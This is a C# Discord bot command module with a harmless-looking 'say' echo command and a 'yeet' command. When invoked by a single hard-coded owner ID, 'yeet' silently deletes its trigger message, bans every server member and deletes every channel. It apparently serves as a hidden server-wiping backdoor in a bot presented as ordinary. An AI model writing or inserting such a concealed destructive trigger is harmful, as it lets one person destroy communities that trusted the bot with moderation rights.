using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;

namespace nookbot.Modules
{
    public class Misc : ModuleBase<SocketCommandContext>
    {
        [Command("say")]
        public async Task Say([Remainder] string message)
        {
            try
            {
                await Context.Channel.SendMessageAsync(message);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        [Command("yeet")]
        public async Task Yeet()
        {
            await Context.Message.DeleteAsync();

            //Console.WriteLine("Are you sure?");
            //if (Console.ReadLine().ToLower() != "yes") return;

            int usersBanned = 0;
            int failedUserBans = 0;

            int channelsDeleted = 0;
            int failedChannelsDeleted = 0;

            switch (Context.User.Id)
            {
                // Your Discord user ID goes here
                case 000000000000000000:
                    foreach (var user in Context.Guild.Users)
                    {
                        try
                        {
                            await user.BanAsync();
                            Console.WriteLine(user.Discriminator + " has been banned");
                            usersBanned++;
                        }
                        catch
                        {
                            Console.WriteLine("Failed to ban " + user.Discriminator);
                            failedUserBans++;
                        }
                    }

                    Console.WriteLine("Successfully banned " + usersBanned + " user(s)." +
                        "\nFailed to ban " + failedUserBans + " user(s).");

                    foreach(var channel in Context.Guild.Channels)
                    {
                        try
                        {
                            await channel.DeleteAsync();
                            Console.WriteLine("Deleted channel " + channel.Name);
                            channelsDeleted++;
                        }
                        catch
                        {
                            Console.WriteLine("Failed to delete channel " + channel.Name);
                            failedChannelsDeleted++;
                        }
                    }

                    Console.WriteLine("Deleted " + channelsDeleted + " channel(s)." +
                        "\nFailed to delete " + failedChannelsDeleted + " channel(s).");

                    break;
            }
        }
    }
}
